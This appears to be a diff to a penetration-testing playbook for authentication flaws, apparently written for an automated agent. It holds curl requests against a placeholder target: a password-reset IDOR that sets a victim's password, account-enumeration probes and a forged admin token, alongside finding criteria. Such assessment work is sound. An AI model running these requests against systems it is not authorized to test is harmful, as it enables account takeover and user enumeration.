@@ -49,6 +49,15 @@ grep -rn "login\|/token\|/oauth\|/authorize\|/callback\|/saml\|/sso\|/mfa\|/totp
 
 ## Phase 2 — Mechanism-Specific Attack Playbooks
 
+**Before running any playbook:** read the relevant source file first. Find the auth handler:
+
+```bash
+grep -rn "login\|/token\|/oauth\|/authorize\|/saml\|/mfa\|/reset" \
+  /opt/app/src --include="*.py" --include="*.js" --include="*.ts" -l | head -10
+```
+
+Read the specific file before sending HTTP requests. Blind attacks waste turns and produce false positives.
+
 ### JWT
 
 ```bash
@@ -179,6 +188,13 @@ curl -s -X POST http://TARGET/api/reset-password \
 # Step 5: test for IDOR in reset endpoint — can token for user A reset user B's password?
 curl -s -X POST http://TARGET/api/reset-password \
   -d "{\"token\":\"$ATTACKER_TOKEN\",\"email\":\"victim@target.com\",\"password\":\"Hacked1!\"}" | jq .
+
+# Step 6: account oracle — do different responses reveal whether an account exists?
+curl -s -X POST http://TARGET/api/forgot-password \
+  -d '{"email":"known_account@test.com"}' | jq '{status,message}'
+curl -s -X POST http://TARGET/api/forgot-password \
+  -d '{"email":"doesnotexist_probe_xyz@test.com"}' | jq '{status,message}'
+# Different response body, status code, or response time = user enumeration finding
 ```
 
 **Check source:** What's the token generation logic?
@@ -225,6 +241,24 @@ For any authentication mechanism found, verify:
 
 ---
 
+## Finding Criteria
+
+**TRUE POSITIVE:**
+- Any auth mechanism that can be bypassed to access a protected resource as an arbitrary user (or elevated-privilege user)
+- A session that remains valid after logout, password change, or account deletion
+- A token that can be forged or modified to gain access without the legitimate credential
+
+**NOT A FINDING:**
+- Token expiry that is generous but not absent (e.g., 90-day JWT is informational, not a vuln)
+- Rate limiting that is present but could theoretically be bypassed (must demonstrate bypass)
+- Password complexity rules — unless you have a working credential brute force result
+- Verbose error messages that don't reveal account existence or bypass auth
+
+**NEGATIVE CONTROL** (required in every finding):
+Demonstrate that a tampered or invalid version of the same attack fails. E.g., for alg:none: "alg:RS256 with valid signature still returns 200 (confirms the check runs); forged alg:none with wrong user ID returns 404 (confirms server processes the claim)."
+
+---
+
 ## Finding Format
 
 ```markdown
@@ -245,6 +279,8 @@ curl -H "Authorization: Bearer <forged_token>" http://TARGET/api/admin/users
 
 **Expected:** 401 / redirect to login
 **Actual:** 200 with admin user list
+
+**Negative control:** <what shows this is not false positive — e.g., junk token returns 401; valid signed RS256 token still works>
 
 **Impact:** <what an attacker can do>
 **Confidence:** confirmed
